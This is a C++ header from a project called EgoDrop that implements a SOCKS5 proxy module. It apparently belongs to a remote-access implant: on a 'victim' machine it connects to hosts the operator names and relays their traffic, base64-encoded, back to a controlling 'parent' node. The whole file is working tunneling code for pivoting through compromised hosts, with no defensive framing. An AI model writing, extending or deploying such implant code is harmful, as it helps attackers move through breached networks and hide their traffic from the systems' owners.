/*
Name: EgoDrop SOCKS5 proxy module.
Author: iss4cf0ng/ISSAC

Description:
    Establish SOCKS5 tunnel between parent machine and target host and forwarding network stream.
*/

#pragma once

#include <iostream>
#include <unistd.h>
#include <arpa/inet.h>
#include <string>
#include <memory>
#include <atomic>
#include <thread>
#include <netdb.h>

#include "clsEZData.hpp"
#include "clsVictim.hpp"
#include "clsTools.hpp"

class clsProxySocks5 : public std::enable_shared_from_this<clsProxySocks5>
{
private:
    std::shared_ptr<clsVictim> m_vicParent;
    int m_nStreamId = -1;
    std::string m_szIPv4;
    int m_nPort = -1;

    int m_nSkt = -1;

    std::atomic<bool> m_bIsRunning { false };
    std::mutex m_mtxSend;

    std::thread m_thdParent;
    std::thread m_thdVictim;

public:
    //Constructor
    clsProxySocks5() = default;

    //Constructor
    clsProxySocks5(std::shared_ptr<clsVictim> victim, int nStreamId, std::string& szIPv4, int nPort)
    {
        m_vicParent = victim;
        m_nStreamId = nStreamId;
        m_szIPv4 = szIPv4;
        m_nPort = nPort;

        m_nSkt = socket(AF_INET, SOCK_STREAM, 0);
        if (m_nSkt < 0)
        {
            clsTools::fnLogErr("Socket init failed.");
            return;
        }
    }

    ~clsProxySocks5()
    {

    }

    //Open proxy adapter.
    bool fnbOpen()
    {
        addrinfo hints{}, *res = nullptr;
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;

        if (getaddrinfo(m_szIPv4.c_str(), std::to_string(m_nPort).c_str(), &hints, &res) != 0)
        {
            clsTools::fnLogErr("getaddrinfo failed");
            return false;
        }

        m_nSkt = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (m_nSkt < 0)
        {
            freeaddrinfo(res);
            return false;
        }

        if (connect(m_nSkt, res->ai_addr, res->ai_addrlen) < 0)
        {
            freeaddrinfo(res);
            close(m_nSkt);
            m_nSkt = -1;
            return false;
        }

        freeaddrinfo(res);

        m_bIsRunning = true;

        auto self = shared_from_this();
        m_thdVictim = std::thread([self]()
        {
            self->fnRecvFromVictim();
        });

        m_thdVictim.detach();

        return true;
    }

    //Close socket.
    void fnClose()
    {
        if (!m_bIsRunning.exchange(false))
            return;

        m_bIsRunning = false;

        if (m_nSkt >= 0)
        {
            close(m_nSkt);
            m_nSkt = -1;
        }
    }

    std::thread::id fnGetThreadId()
    {
        return m_thdVictim.get_id();
    }

    bool send_all(int fd, const uint8_t* abBuffer, size_t len)
    {
        size_t sent = 0;
        while (sent < len)
        {
            ssize_t n = send(fd, abBuffer + sent, len - sent, 0);
            if (n <= 0)
                return false;

            sent += n;
        }

        return true;
    }

    //Forwarding network stream buffer.
    void fnForwarding(std::vector<uint8_t>& abBuffer)
    {
        if (!m_bIsRunning || m_nSkt < 0)
            return;

        std::lock_guard<std::mutex> lk(m_mtxSend);
        if (!send_all(m_nSkt, abBuffer.data(), abBuffer.size()))
        {
            fnClose();
        }
    }

    //Receive data from remote and redirect it to the parent node.
    void fnRecvFromVictim()
    {
        uint8_t abBuffer[8192];
        while (m_bIsRunning)
        {
            int nRecv = recv(m_nSkt, abBuffer, sizeof(abBuffer), 0);
            if (nRecv <= 0)
                break;

            std::vector<uint8_t> vuBuffer(abBuffer, abBuffer + nRecv);
            std::string szb64 = clsEZData::fnb64Encode(vuBuffer);

            STRLIST ls = {
                "proxy",
                "socks5",
                "data",
                std::to_string(m_nStreamId),
                szb64,
            };

            m_vicParent->fnSendCommand(ls);
        }

        STRLIST ls = {
            "proxy",
            "socks5",
            "close",
            std::to_string(m_nStreamId),
        };

        m_vicParent->fnSendCommand(ls);
        
        m_bIsRunning = false;
    }
};